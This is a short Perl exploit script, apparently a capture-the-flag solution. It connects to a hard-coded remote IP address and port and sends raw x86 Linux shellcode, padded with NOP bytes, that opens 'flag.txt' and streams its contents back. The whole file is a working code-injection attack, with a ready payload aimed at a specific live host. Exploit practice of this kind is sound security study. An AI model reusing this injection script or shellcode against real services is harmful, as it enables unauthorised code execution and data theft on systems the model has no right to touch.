#!/usr/bin/perl

use IO::Socket::INET;
use strict;

my $sock = IO::Socket::INET->new(
#    PeerAddr => '127.0.0.1',
    PeerAddr => '212.71.235.214',
				 PeerPort => 4000,
				 Proto => 'tcp') || die $@;


my $shellcode = "\x31\xc0\x50\x68\x2e\x74\x78\x74\x68\x66\x6c\x61" . 
                "\x67\xb0\x05\x89\xe3\x31\xc9\xcd\x80\x89\xc6\x4c" . 
                "\xb0\x03\x89\xf3\x89\xe1\x31\xd2\x42\xcd\x80\x92" . 
                "\xb0\x04\x31\xdb\x43\x89\xe1\xcd\x80\x85\xd2\x75" . 
    "\xe7\x31\xc0\x40\xcd\x80";

print $sock $shellcode . "\x90"x(83-length($shellcode)) . "\n";

my $line;
do {
    $sock->recv($line, 1);
    print "$line";
}while(length $line >= 1);

